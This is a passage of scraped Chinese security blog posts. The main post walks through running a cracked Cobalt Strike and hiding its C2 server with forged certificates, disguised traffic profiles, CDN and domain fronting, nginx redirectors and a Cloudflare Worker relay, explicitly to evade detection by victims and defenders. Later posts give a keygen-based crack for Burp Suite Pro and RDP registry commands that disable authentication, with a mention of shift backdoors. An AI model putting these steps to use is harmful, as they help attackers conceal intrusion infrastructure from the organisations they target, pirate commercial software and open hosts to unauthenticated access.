[/path/to/c2.profile] [YYYY-MM-DD] 必填参数host 本服务器外网IP/域名 必填参数password Client GUI连接时需要输入的密码 可选参数Malleable C2 communication profile 指定C2通信配置文件 该功能体现了CS的强大扩展性 可选参数kill date 指定所有payload的终止日期 这里用 ./teamserver 192.168.0.120(本机ip) 123456(登入密码) windows windows启动服务端 命令行启动teamserver.bat，参数与linux一致 新建 teamserver.bat 文件 内容如下： @echo off :check_java java -version &gt;nul 2&gt;&amp;1 if %errorLevel% == 0 ( goto:check_permissions ) else ( echo [-] is Java installed? goto:eof ) :check_permissions echo [+] Administrative permissions required. Detecting permissions... set TempFile_Name=%SystemRoot%\\System32\\BatTestUACin_SysRt%Random%.batemp (echo &quot;BAT Test UAC in Temp&quot; &gt;%TempFile_Name% ) 1&gt;nul 2&gt;nul if exist %TempFile_Name% ( echo [+] Success: Administrative permissions confirmed. del %TempFile_Name% 1&gt;nul 2&gt;nul goto:check_certificate ) else ( echo [-] Failure: Current permissions inadequate. goto:eof ) :check_certificate set certificate=&quot;.\\cobaltstrike.store&quot; if exist %certificate% ( goto:test_arguments ) else ( echo [!] cobaltstrike.store not fond! echo [!] generating the cobaltstrike.store! echo [!] Command: keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot; keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth ) :test_arguments set argC=0 for %%x in (%*) do Set /A argC+=1 if %argC% LSS 2 ( echo [-] teamserver ^&lt;host^&gt; ^&lt;password^&gt; [/path/to/c2.profile] [YYYY-MM-DD] echo ^&lt;host^&gt; is the default IP address of this Cobalt Strike team server echo ^&lt;password^&gt; is the shared password to connect to this server echo [/path/to/c2.profile] is your Malleable C2 profile echo [YYYY-MM-DD] is a kill date for Beacon payloads run from this server goto:eof ) else ( goto:run_cobal ) :run_cobal java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Dcobaltstrike.server_bindto=0.0.0.0 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC --add-opens=java.base/java.lang.reflect=ALL-UNNAMED -classpath ./cobaltstrike.jar -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 server.TeamServer %* 客户端连接 windows cobalstrike.bat 直接双击启动 java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -Duser.language=en -jar cobaltstrike.jar vbs无窗口启动 windows 同目录新建 cobalstrike.vbs 文件，写入如下代码，即可无窗口启动 cs CreateObject(&quot;WScript.Shell&quot;).Run &quot;java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar&quot;,0 linux start.sh java -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -javaagent:CSAgent.jar=5e98194a01c6b48fa582a6a9fcbb92d6 -jar cobaltstrike.jar $* 0x03 C2隐藏 无论是权限维持还是增加溯源成本， C2 隐藏 、流量加密，在实际的攻防对抗中还是很有必要的 端口特征修改 cobalt strike 服务端 默认50050端口，修改也很简单。只需要编辑teamserver文件，将50050修改为想要更改的端口即可。 流量特征混淆 我们cs的客户端/服务端的流量通信，大部分流量审计软件，都能检测到cs默认的通信流量。 Malleable C2 profile作为CS的配置文件，可以配置通信流量的特征，用来隐藏自己的行踪。 详情看官方文档：https://www.cobaltstrike.com/help-malleable-c2 cs官网给出的配置文件编写指南： https://www.cobaltstrike.com/help-malleable-c2 官方也给出了一个可修改的配置文件： https://github.com/rsmudge/Malleable-C2-Profiles 也有别人配置好的: https://github.com/xx0hcd/Malleable-C2-Profiles/tree/master/normal https://github.com/threatexpress/malleable-c2 这里使用伪造jQuery的C2-Profile 查看配置是否可用： ./c2lint jquery-c2.4.3.profile 启动配置： ./teamserver 服务器ip cs密码 混淆配置文件 证书特征修改 服务端证书修改 cobaltstrike.store 证书只用于服务端和客户端通讯。区别于HTTPS上线使用的证书。 cobaltstrike.store 证书含有cs的相关特征,例如 CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike fofa相关搜索语法: protocol==&quot;cobaltstrike&quot; cert=&quot;Major Cobalt Strike&quot; cert=&quot;73:6B:5E:DB:CF:C9:19:1D:5B:D0:1F:8C:E3:AB:56:38:18:9F:02:4F&quot; Keytool是一个java数据证书的管理工具，Keytool将密钥 和 证书 存放在一个称为 keystore 的文件中,即.store后缀的文件中。 修改CS证书方式有两种, 无论是那种方式都需要先删除原有的文件cobaltstrike.store 方法一: 先删除原有的cobaltstrike.store，使用以下命令直接生成密钥库文件 ， 可自行修改 keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.cn -dname &quot;CN=360, OU=360.cn, O=Sofaware,L=Somewhere,ST=Cyberspace, C=CN&quot; 或者 keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias gmail.com -dname &quot;CN=gmail.com, OU=Google Mail, O=Google GMail, L=Mountain View, ST=CA, C=US&quot; 方法二： 修改teamserver文件，teamserver 是启动cs服务端的启动文件， 里面有密钥库的检测代码。 如检测到密钥库文件不存在，就使用命令生成新的密钥库 生成代码如下： keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname &quot;CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth&quot; 将上面生成密钥库部分的代码替换成自己修改的即可。 ps: 同样需要删除原有的cobaltstrike.store文件，不然不会执行生成代码 上线证书修改 如果想要修改这个证书，需要修改Malleable C2 profile。 Self-signed Certificates with SSL Beacon 和 Valid SSL Certificates with SSL Beacon 这两个都是用来修改https上线使用的证书的。 Self-signed Certificates with SSL Beacon 这里是自己设定的自签名证书。 Valid SSL Certificates with SSL Beacon 这里是叫我们使用有效的证书。 我们可以使用之前修改过的cobaltstrike.store，也可以使用从其他地方弄过来的证书 我们可以在启动CobaltStrike的时候，指定一个profile文件，然后在文件中配置上线时使用的证书文件即可修改上线时默认的证书。 这里以 jquery-c2.4.2.profile 为例 ： https-certificate { ## Option 1) Trusted and Signed Certificate ## Use keytool to create a Java Keystore file. ## Refer to https://www.cobaltstrike.com/help-malleable-c2#validssl ## or https://github.com/killswitch-GUI/CobaltStrike-ToolKit/blob/master/HTTPsC2DoneRight.sh ## Option 2) Create your own Self-Signed Certificate ## Use keytool to import your own self signed certificates #set keystore &quot;/pathtokeystore&quot;; #set password &quot;password&quot;; ## Option 3) Cobalt Strike Self-Signed Certificate set C &quot;US&quot;; set CN &quot;jquery.com&quot;; set O &quot;jQuery&quot;; set OU &quot;Certificate Authority&quot;; set validity &quot;365&quot;; } 自定义生成证书修改Option 3 下面的选项即可， 使用前面服务端生成的 cobaltstrike.store 或者 自己申请的真实证书，注释掉 Option 3，使用 Option 2即可 set keystore &quot;/pathtokeystore.store&quot;; # 密钥库文件路径 set password &quot;password&quot;; # 密钥库密码 CloudFlare证书申请 如果接入了Cloudflare CDN，可以直接使用Cloudflare提供的证书，或者使用letsencrypt这样的免费证书。 SSL/TLS --&gt; 源服务器 使用默认配置生成证书和秘钥后，复制粘贴到你的服务器上，这里选择的文件名 server.pem和server.key。 # xxx.xxx.com 为申请的域名 openssl pkcs12 -export -in server.pem -inkey server.key -out xxx.xxx.com.p12 -name xxx.xxx.com -passout pass:123456 keytool -importkeystore -deststorepass 123456 -destkeypass 123456 -destkeystore xxx.xxx.com.store -srckeystore xxx.xxx.com.p12 -srcstoretype PKCS12 -srcstorepass 123456 -alias xxx.xxx.com 在生成keystore文件后将该文件放在CS的根目录下，务必确保keystore文件名与密码和https-certificate中设置的一致。 ./c2lint jquery-c2.4.3.profile // 检查一下是否可用 dns_idle 0.0.0.0是Cobalt Strike DNS Beacon特征可设置Malleable C2进行修改 输入set dns_idle &quot;8.8.8.8&quot;; ip/域名隐藏 CDN 让cdn转发合法的http或者https流量来达到隐藏的目的。 反溯源-cs和msf域名上线 利用CDN隐藏C2地址 使用CDN隐藏c2流量 配置了cdn 拥有一个公网域名 配置cdn的A记录解析使其能解析到C2的ip 将公网域名填写到cs listener的host处并填写可用的端口 可达到的效果：受害主机上只会有跟cdn的ip通信的流量，不会有跟真实C2通信的流量，可以保护C2的ip，但是域名还是会暴露。 技术实现重点： 一个不备案的域名，否则这个方式毫无用处 这种技术对http与https没有强制要求，都可以使用，而域前置技术要求是https 可以去Freenom 申请一个免费的域名，有了域名后可以直接接入Cloudflare 接入后更改NS，按照Cloudflare的指示将域名的NS设置成Cloudflare的即可，这里不再赘述。 接入后配置一个DNS的A记录，解析到VPS的IP，后续上线用。 Cloudflare CDN配置 https配置 Cloudflare默认的TLS配置为灵活，由于之前使用了Cloudflare给原服务器发的证书，我们可以改成完全（严格）提高安全性。 禁用缓存 在这个Profile jquery-c2.4.2.profile 中，我们请求的URI是以.js结尾的，Cloudflare作为一个CDN肯定要去缓存它， 但这样的话请求就无法到达我们的CS服务器，自然也就无法上线了。 添加Cloudflare 规则 ，不代理js请求。 URL匹配 如果URL匹配： xxx.xxx.com/*js 则设置为： 缓存级别 绕过 Profile配置 我们需要更改Profile中的响应头配置,不然可能会出现能上线但是无法回显命令的情况 header &quot;Content-Type&quot; &quot;application/javascript; charset=utf-8&quot;; 修改为： header &quot;Content-Type&quot; &quot;application/*; charset=utf-8&quot;; 即可正常执行命令回显。 ./teamserver your_ip your_pass jquery-c2.4.3.profile Listener配置 添加一个HTTPS监听器 填入三次你的域名，其他的默认就好。 在确保域名解析正确的情况下，此时HTTPS BEACON已经可以上线了 这里需要注意的是免费版的Cloudflare对代理的端口有限制。我们只能成如下端口： http：80、8080、8880、2052、2082、2086、2095 https：443、2053、2083、2087、2096、8443 以上针对的是https的beacon，http的话在DNS中加一个二级域名并使用该二级域名上线即可。 不用额外再弄一个profile，因为http的beacon只看域名。 域前置 参考链接： 域前置技术实践 域前置技术原理与在CS上的实现 域前置攻击复现 | 域前置水太深，偷学六娃来隐身 暗度陈仓：基于国内某云的 Domain Fronting 技术实践 Domain Fronting，中文名域前置，是一种用于隐藏真实C2服务器IP且同时能伪装为与高信誉域名通信的技术， 多用于木马受控端和控制端之间的隐蔽通信。 反向代理 受害者上只会有与重定向机器之间的流量，不会有与真实c2服务器的流量， 重定向服务器会将非beacon的请求重定向到一些高信誉域名上，达到迷惑的目的 利用CDN、域前置、重定向三种技术隐藏C2的区别 Malleable C2 profile配置 以 jquery-c2.4.2.profile 为列 : http 全局配置中 开启转发 否则获取不到 出网 IP http-config { set headers &quot;Date, Server, Content-Length, Keep-Alive, Connection, Content-Type&quot;; header &quot;Server&quot; &quot;Apache&quot;; header &quot;Keep-Alive&quot; &quot;timeout=10, max=100&quot;; header &quot;Connection&quot; &quot;Keep-Alive&quot;; # Use this option if your teamserver is behind a redirector set trust_x_forwarded_for &quot;true&quot;; ##如果您的团队服务器位于重定向器后面，请使用此选项 } 设置UA，可以结合 UA 特征过滤 set useragent &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;; Nginx配置 可以使用脚本生成 https://github.com/threatexpress/cs2modrewrite python3 ./cs2nginx.py -i havex.profile -c https://127.0.0.1:8443 -r https://www.baidu.com -H cdn.xxxx.club -i 为CS使用的profile模板文件 -c 为后端CS绑定的端口，这个会在后面CS的配置中有所体现 -r 为不合要求的访问302重定向去的位置，这里填了百度 -H 为你的域名，这里就是你配的那个 在配置完后，需要配置ssl证书 ##################### # SSL Configuration ##################### listen 443 ssl; listen [::]:443 ssl; ssl on; ssl_certificate /root/tool/CS/https/server.pem; # 改这个 ssl_certificate_key /root/tool/CS/https/server.key; # 改这个 ssl_session_cache shared:le_nginx_SSL:1m; # managed by Certbot ssl_session_timeout 1440m; # managed by Certbot ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # managed by Certbot ssl_prefer_server_ciphers on; # managed by Certbot 同时的话还可以定制化处理location块，使得只有指定URL才能访问，保证了不会被扫到。 以 User-Agent 来过滤流量 location ~ ^(/jquery-3\\.3\\.1\\.slim\\.min\\.js|/jquery-3\\.3\\.2\\.min\\.js|/jquery-3\\.3\\.1\\.min\\.js|/jquery-3\\.3\\.2\\.slim\\.min\\.js)$ { if ($http_user_agent != &quot;Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko&quot;) { return 302 $REDIRECT_DOMAIN$request_uri; } # 把流量转到CS 监听的 HTTP port(bind) 端口上 # proxy_pass $C2_SERVER; proxy_pass https://192.168.30.10:8080; # If you want to pass the C2 server's &quot;Server&quot; header through then uncomment this line # proxy_pass_header Server; expires off; proxy_redirect off; proxy_set_header Host $host; # 配置nginx 转发源ip proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; proxy_set_header X-Real-IP $remote_addr; } 重启Nginx服务 systemctl restart nginx 配置防火墙 如果cs服务器和配置反向代理的Nginx的服务器是同一台，CS的listener监听的地址是0.0.0.0， 别人依旧可以直接访问我们CS监听的端口而分析出beacon信息，我们应该配置成只能让反向代理套件访问。 以iptables为例： iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8443 -j ACCEPT iptables -A INPUT -p tcp --dport 8443 -j DROP iptables -A INPUT -s 127.0.0.1 -p tcp --dport 8880 -j ACCEPT iptables -A INPUT -p tcp --dport 8880 -j DROP Cloudflare Workers隐藏域名 这个有点类似域前置，使用Cloudflare Workers可以隐藏我们的真实域名。 添加Works，申请好子域后创建服务，点击快速编辑, 复制如下脚本 粘贴： let upstream = 'https://cdn.xxxx.club' # 这里写你的域名 addEventListener('fetch', event =&gt; { event.respondWith(fetchAndApply(event.request)); }) async function fetchAndApply(request) { const ipAddress = request.headers.get('cf-connecting-ip') || ''; let requestURL = new URL(request.url); let upstreamURL = new URL(upstream); requestURL.protocol = upstreamURL.protocol; requestURL.host = upstreamURL.host; requestURL.pathname = upstreamURL.pathname + requestURL.pathname; let new_request_headers = new Headers(request.headers); new_request_headers.set(&quot;X-Forwarded-For&quot;, ipAddress); let fetchedResponse = await fetch( new Request(requestURL, { method: request.method, headers: new_request_headers, body: request.body }) ); let modifiedResponseHeaders = new Headers(fetchedResponse.headers); modifiedResponseHeaders.delete('set-cookie'); return new Response( fetchedResponse.body, { headers: modifiedResponseHeaders, status: fetchedResponse.status, statusText: fetchedResponse.statusText } ); } 之后使用右侧的域名替换CS中https beacon的三个域名即可 云函数隐匿真实IP 云函数，顾名思义就是在云上跑的一个函数，运行服务器由服务商提供，自带CDN效果。 那我们可以运行一个函数来转发我们的流量，就可以隐藏自己的真实IP。 参考： C2使用云函数进行隐藏和加速 为你的C2隐藏与加速 Heroku代理隐匿真实IP 参考： 红队攻防基础建设—C2 IP隐匿技术 - 安全客，安全资讯平台 Beacon Staging 特征 Beacon Staging Server 就是分阶段模式中，提供shellcode等功能扩展存储的Stage服务器。 Beacon Staging Server的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递。 首先通过投递一个被称为stager的小巧的payload，然后去Beacon staging server下载体积较大更复杂的stage，并且访问stage的URL通过checksum8进行校验。 由Windows Execute 模块生成的就是Stager。 stager上线逻辑： ——&gt;运行stager——&gt;自动生成并访问符合checksum8校验的URI进行远程下载stage——&gt;上线 360的Quake主动测绘已经有了通过beacon查找C2。 具体参考 https://www.anquanke.com/post/id/224535 nmap 也可以扫出来 nmap [ip][port] --script=grab_beacon_config.nse Beacon Staging 特征修改方法 修改源码加密的密钥 , 参考：Bypass cobaltstrike beacon config scan 限制端口访问，让一般的扫描器扫不了出开， 这里我们可以参考上文 用nginx做反向代理，结合 profile文件 通过ua过滤流量 Cobalt Strike 结合Nginx做反向代理 0x04 插件推荐 k8gege/Aggressor 巨龙拉冬 lintstar/LSTAR: LSTAR - CobaltStrike 综合后渗透插件 DeEpinGh0st/Erebus: CobaltStrike后渗透测试插件 pandasec888/taowu-cobalt-strike Mikasazero/Cobalt-Strike: 参考师傅们写的CS的脚本 timwhitez/Cobalt-Strike-Aggressor-Scripts: Cobalt Strike Aggressor 插件包 cobaltstrike插件 frp0.33修改版,过流量检测,免杀,支持加载远程配置文件可用于cs直接使用的插件 yanghaoi/CobaltStrike_CNA z1un/Z1-AggressorScripts 422926799/csplugin: 自己开的cs插件 上线进程自动转移 0x05 问题集 TeamServer.prop 在 4.4 版本之后，您可能在启动团队服务器时注意到一条警告消息： [!] Properties file (../TeamServer.prop) was not found. TeamServer.prop这个文件是可选的，不影响启动。 它包含许多可选参数，可用于自定义用于验证屏幕截图和键盘日志回调数据的设置，从而允许您调整HotCobalt漏洞的修复程序。 可以通过创建一个名为 TeamServer.prop 的空文件并将其保存在 Cobalt Strike 目录中来抑制警告。 TeamServer.prop 示例文件可以从 Cobalt-Strike/TeamServerProp GitHub 存储库下载在这里。 默认 TeamServer.prop 文件包含以下内容： #Cobalt Strike Team Server Properties #Fri May 07 12:00:00 CDT 2021 # ------------------------------------------------ # Validation for screenshot messages from beacons # ------------------------------------------------ # limits.screenshot_validated=true # limits.screenshot_data_maxlen=4194304 # limits.screenshot_user_maxlen=1024 # limits.screenshot_title_maxlen=1024 # Stop writing screenshot data when Disk Usage reaches XX% # Example: Off # &quot;limits.screenshot_diskused_percent=0&quot; # Example: Stop writing screenshot data when Disk Usage reaches 95% # &quot;limits.screenshot_diskused_percent=95&quot; # Default: # limits.screenshot_diskused_percent=95 # ------------------------------------------------ # Validation for keystroke messages from beacons # ----------------------------------------------- # limits.keystrokes_validated=true # limits.keystrokes_data_maxlen=8192 # limits.keystrokes_user_maxlen=1024 # limits.keystrokes_title_maxlen=1024 # Stop writing keystroke data when Disk Usage reaches XX% # Example: Off # &quot;limits.keystrokes_diskused_percent=0&quot; # Example: Stop writing keystroke data when Disk Usage reaches 95% # &quot;limits.keystrokes_diskused_percent=95&quot; # Default: # limits.keystrokes_diskused_percent=95 以#开头的行是注释。 limit.*_data_maxlen 是将被处理的屏幕截图/keylog 数据的最大大小。超过此限制的回调将被拒绝。 limit.*_validated=false 表示忽略以下三个 …_maxlen 设置 将任何..._maxlen 设置设置为零将禁用该特定设置 limit.*_diskused_percent设置回调处理的阈值。当磁盘使用率超过指定百分比时回调被拒绝。 limit.*_diskused_percent=0（零） 禁用此设置，有效值为 0-99 WARNING: An illegal reflective access operation has occurred WARNING: An illegal reflective access operation has occurred 主要出现在高版本(&gt;=jdk9)情况下，没有影响，忽略就好 在启动项加个如下命令即可忽略该warning --add-opens=java.base/java.lang.reflect=ALL-UNNAMED 0x06 参考文章 https://github.com/aleenzz/Cobalt_Strike_wiki Twi1ight/CSAgent: CobaltStrike 4.x通用白嫖及汉化加载器 Releases · k8gege/Aggressor 利用CDN、域前置、重定向三种技术隐藏C2的区别 Cobalt Strike 的特征与隐藏 C2服务器隐藏真实ip – 梦中世界 检测与隐藏Cobaltstrike服务器 - Blog CobaltStrike特征隐藏 APT级CS隐藏教程：使用反向代理、C2-Profile和CDN拉满溯源难度 CobaltStrike上线隐藏 ","link":"https://bewhale.github.io/post/CobaltStrike4.4汉化破解及特征去除/"},{"title":"Windows最新版burpsuite安装破解(内置JDK,附下载连接)","content":"安装破解 burp 官网下载地址：https://portswigger.net/burp/releases Java 环境9及以上的，在burp官网下载最新的jar格式的burp， 然后按照以下地址的安装破解教程走就好了 Burp Suite Pro Loader &amp; Keygen ( BurpSuite version v2020.1 - ∞ ) 重点来说一下，java 环境 8及以下，并且未安装或者不想安装多java环境的改怎么操作 在burp官网下载最新版本burp, 选择windows版下载，自带java环境，无需额外下载。 Loader Keygen下载地址： BurpLoaderKeygen-Modified 汉化版下载地址： BurpLoaderKeygenCn 支持汉化 安装Burp Suite ，然后将BurpLoaderKeygen放入安装目录 在此目录新建vbs文件 StartLoaderCn.vbs文件, 用来启动BurpLoaderKeygenCn，内容如下 CreateObject(&quot;Wscript.Shell&quot;).run &quot;cmd /k .\\jre\\bin\\java.exe -jar BurpLoaderKeygenCn.jar&quot;,0 双击运行StartLoaderCn.vbs，选中CN，即可将burp汉化， 选中Auto Run，以后打开StartLoader.vbs文件即可直接打开burp(这里也可以默认不动，选择使用后面的启动脚本来启动) 点击run，启动burp， 第一次使用burpsuite，需要破解， 将License复制到burp，点击next，选择manual activation(手动激活) 点击 copy requests，粘贴到Loader里面的Activation Request框里面，会自动生成生成Activation Response 复制Activation Response框里面的内容，到burp，点击Paste response，再点击next即可激活burp。 可选 burpsuite.vbs文件，用来启动Burp，内容如下 CreateObject(&quot;WScript.Shell&quot;).Run &quot;.\\jre\\bin\\java.exe --illegal-access=permit -Xmx512m -noverify -javaagent:BurpLoaderKeygen.jar -Dfile.encoding=utf-8 -jar burpsuite_pro.jar&quot;,0 burpsuiteCn.vbs文件，用来启动汉化版Burp，内容如下 CreateObject(&quot;WScript.Shell&quot;).Run &quot;.\\jre\\bin\\java.exe --illegal-access=permit -Xmx512m -noverify -javaagent:BurpLoaderKeygenCn.jar=cn -Dfile.encoding=utf-8 -jar burpsuite_pro.jar&quot;,0 插件推荐 有关burpsuite的插件(非商店),文章以及使用技巧的收集 https://github.com/Mr-xn/BurpSuite-collections burp前端加密爆破插件 https://github.com/whwlsfb/BurpCrypto log4j https://github.com/whwlsfb/Log4j2Scan https://github.com/f0ng/log4j2burpscanner shiro被动扫描 https://github.com/pmiaowu/BurpShiroPassiveScan/ captcha-killer要解决的问题是让burp能用上各种验证码识别技术 https://github.com/ffffffff0x/BerylEnigma domain_hunter的高级版本，SRC挖洞、HW打点之必备！自动化资产收集；快速Title获取；外部工具联动；等等 https://github.com/bit4woo/domain_hunter_pro A burp extension that add some useful function to Context Menu 添加一些右键菜单让burp用起来更顺畅 https://github.com/bit4woo/knife Burpsuite-Plugins-Usage https://github.com/lilifengcode/Burpsuite-Plugins-Usage BurpSuite_403Bypasser https://github.com/sting8k/BurpSuite_403Bypasser https://github.com/p0desta/AutoBypass403-BurpSuite http-request-smuggler-all.jar ---HTTP走私攻击检查插件 商店可以安装 https://github.com/PortSwigger/http-request-smuggler HaE是基于 BurpSuite 插件 JavaAPI 开发的请求高亮标记与信息提取的辅助型插件。 https://github.com/gh0stkey/HaE PSC-DF-1.2 Burp被动流量转发插件优化版感谢您的支持 https://github.com/winezer0/passive-scan-client-plus burp-wildcard-plus 支持burp2020.11.2及后续的版本主题的bp标签管理工具 https://github.com/winezer0/burp-wildcard-plus xray4burp 使用xray自带的raw-request命令，直接扫描burp的原始报文。 https://github.com/winezer0/xray4burp copy-as-any-script 导出burp请求报文为其他语言脚本 https://github.com/winezer0/copy-as-any-script winezer0/burp-random-header 用于实现请求头的动态修改burp插件 。 https://github.com/winezer0/burp-random-header-plus c0ny1/chunked-coding-converter: Burp suite 分块传输辅助插件 https://github.com/c0ny1/chunked-coding-converter 配置文件 # Linux Bp激活信息保存位置 ~/.java/.userPrefs/burp # Linux Bp配置文件位置 ~/.BurpSuite # Windows Bp激活信息保存位置 注册表：HKEY_CURRENT_USER\\Software\\JavaSoft\\Prefs\\burp # Windows Bp配置文件位置 C:\\Users\\%username%\\AppData\\Roaming\\BurpSuite 参考文章 Burp Suite Professional 2021.6.1安装注册 - 哔哩哔哩 TrojanAZhen/BurpSuitePro-2.1: 什么? 你想用免费的BurpSuitePro版本!!! h3110w0r1d-y/BurpLoaderKeygen: Burp Suite Pro Loader &amp; Keygen ( BurpSuite version v2020.1 - ∞ ) https://github.com/Prodject/BurpSuite-collections funkyoummp/BurpSuiteCn: Burp Suite 汉化 中文 一些相见恨晚的BurpSuite插件推荐 ","link":"https://bewhale.github.io/post/Windows最新版burpsuite 安装破解/"},{"title":"RDP安全总结","content":"一、RDP 介绍 RDP，Remote Desktop Protocol，远程桌面协议，该协议是对国际电信联盟发布的一个国际标准的多通道会议协议 T.120 的一个扩展。远程桌面协议让用户（客户端或称 “本地电脑”）连上提供微软终端机服务的电脑（服务器端或称 “远程电脑”）。大部分的 Windows、Linux、FreeBSD、Mac OS X 都有相应的客户端。远程桌面协议在服务端默认监听 TCP 3389 端口的数据。远程桌面协议为用户提供了通过网络连接远程登录到另一台计算机的图形界面。 userauthentication鉴权 那我们在实战中，需要了解另一个权限，userauthentication 权限 ，该权限主要是用于设置远程连接的身份验证，称之为鉴权 详情见：UserAuthentication | Microsoft Docs 0 指定的网络级用户不需要身份验证就能建立远程桌面连接。 这是默认值。 1 指定网络级别的用户身份验证是必需的 我们采用如下命令来开启或者关闭鉴权，这里 0 代表关闭，1 代表开启： REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v UserAuthentication /t REG_DWORD /d 0 /f 关于网络级身份验证(NLA) 所谓网络级验证（network level authentication NLA）是提供给远程桌面连接的一种新安全验证机制，可以在终端桌面连接及登录画面出现前预先完成用户验证程序，由于提前验证部分仅需要使用到较少的网络资源，因此可以有效防范黑客与恶意程序的攻击，同时降低阻断服务攻击(Dos)的机会。 网络级身份验证有以下优点： 开始时它只需要很少的远程计算机资源，因为在验证用户身份之前，远程计算机只使用有限的资源，密码验证通过后才进入远程桌面。在早期版本中，远程计算机会启动完全的远程桌面连接。 它可以通过降低拒绝服务攻击（拒绝服务攻击试图限制或阻止访问 Internet）的风险来帮助提高安全性。 它采用远程计算机身份验证。这有助于防止用户连接到出于恶意目的而建立的远程计算机。 securitylayer 安全层验证 securitylayer 指定服务器和客户端如何彼此进行身份验证之前建立的远程桌面连接。这个安全层验证简单来说就是保证了对话传输保密性更高，它的默认值为 1，指定在建立远程桌面连接之前，服务器和客户端需要进行身份验证，如果这个地方安全层验证的默认值为 1，服务器和客户端就必须要进行身份验证，也就是输入帐号密码的操作。 详情见：SecurityLayer | Microsoft Docs 0 就是连接前使用 rdp 协议进行身份验证，rdp 即远程桌面连接，可以简单理解为就是关闭验证。 1 是指在连接前两端协商来进行身份验证，这个是默认值。 2 就是使用 tls 协议来进行 使用如下命令来进行修改 REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v SecurityLayer /t REG_DWORD /d 0 /f 出现身份验证错误 报错解决 出现身份验证错误，要求的函数不受支持，远程计算机：X.X.X.X，这可能是由于CredSSP加密Oracle修正 方法一 这就需要被连接端关闭鉴权模式，在被连接端使用上述reg命令关闭鉴权 或者在远程桌面连接设置里面，取消 “仅允许运行使用网络级别身份验证的远程桌面的计算机连接” 这一安全设置， 选择运行任意版本远程桌面的计算机连接即可。 方法二 在控制端, win+r，输入regedit，点击确定，打开注册表编辑器； 找到路径： HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\CredSSP\\Parameters 后两项没有时手动建立，右键左侧目录System，选择“新建——项”，输入文件夹名 在Parameters 里 新建 DWORD（32位），名称：“AllowEncryptionOracle”，值：2 再次连接远程计算机，失败则重启。 进入远程桌面登录用户 我在测试过程中，需要同时关闭 userauthentication 和 securitylayer 才可以不用输入凭证 进入 3389 的登录页面 来登录远程桌面。 可以用来留shift后门之类的。 二、查询3389端口方式 查询和开启3389端口方式总结 (1) REG查询3389状态（0：ON、1：OFF） REG query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections (2) REG查询3389端口（16进制-&gt;10进制） REG query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\Wds\\rdpwd\\Tds&quot; /s REG query &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber set /a Port=0xd3d (3) tasklist、netstat命令查询3389端口 tasklist /svc | findstr &quot;TermService&quot; netstat -ano | findstr &quot;2028&quot; 注：有时也会遇到特殊情况，如某虚拟主机自建低权限用户运行的IIS（Users、IIS_IUSRS），tasklist /svc不显示服务名，注册表查看是0xd3d，但netstat -ano里又没有3389端口，这可能是因为3389远程终端被关闭了，Users权限下只能根据个人经验盲猜可疑端口号。 (4) Meterpreter的netstat查询3389端口 有时我们会遇到不能执行netstat、tasklist和reg等命令的情况， 这时可以通过Meterpreter下的netstat命令来快速查询3389端口，先找0.0.0.0运行的svchost.exe，然后根据个人经验盲猜可疑端口号。 (5) 端口扫描 可以借助 Nmap 扫描来验证端口 3389 是否被打开 nmap -sV -sC -p 3389 192.168.93.30 三、开启3389端口方式 (1) MSF命令开启3389端口 支持系统： XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016 meterpreter &gt; run post/windows/manage/enable_rdp meterpreter &gt; run getgui -e 注：getgui可用于开启目标机器的3389远程桌面端口、创建管理员账户密码、禁用远程桌面(TCP-In)防火墙入站规则等。 (2) REG命令开启3389端口 支持系统： XP/Win2k3/Win7/Win2k8/Win8.1/Win10/2012/2016（0：ON、1：OFF） // 开启远程桌面 REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 0 /f // 修改windows远程桌面端口3389为3000(一般情况不要改) REG ADD &quot;HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v &quot;PortNumber&quot; 